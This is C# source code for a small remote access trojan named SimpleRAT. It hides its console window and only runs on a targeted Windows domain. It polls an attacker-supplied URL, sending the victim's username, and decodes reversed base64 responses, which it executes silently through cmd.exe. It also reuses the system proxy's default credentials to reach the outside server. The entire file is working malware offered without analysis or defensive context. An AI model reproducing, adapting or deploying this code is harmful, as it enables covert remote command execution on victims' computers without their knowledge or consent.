using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SimpleRAT
{

    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr VAR102, UInt32 VAR101);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        static void Execute(string cmd)
        {
            try {
                Process p = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;

                startInfo.UseShellExecute = false;
                startInfo.FileName = "cmd.exe";
                startInfo.CreateNoWindow = true;
                startInfo.Arguments = cmd;
                p.StartInfo = startInfo;
                p.Start();

            } catch (Exception e) { 

            }
        }

        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);
            if (Environment.GetEnvironmentVariable("USERDOMAIN") == "CHANGEME")
            {
                WebClient client = new WebClient();
                IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
                if (defaultProxy != null)
                {
                    defaultProxy.Credentials = CredentialCache.DefaultCredentials;
                    client.Proxy = defaultProxy;
                }

                while (true)
                {
                        byte[] cmd = client.DownloadData(args[1] + "?" + Environment.GetEnvironmentVariable("USERNAME"));
                        Array.Reverse(cmd, 0, cmd.Length);
                        string run =  Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(cmd)));
                    if (run.Length > 0)
                    {
                        Thread t = new Thread(() => Execute(run));
                        t.Start();
                        Thread.Sleep(10000);
                    }                   
                }
            }
        }
    }
}
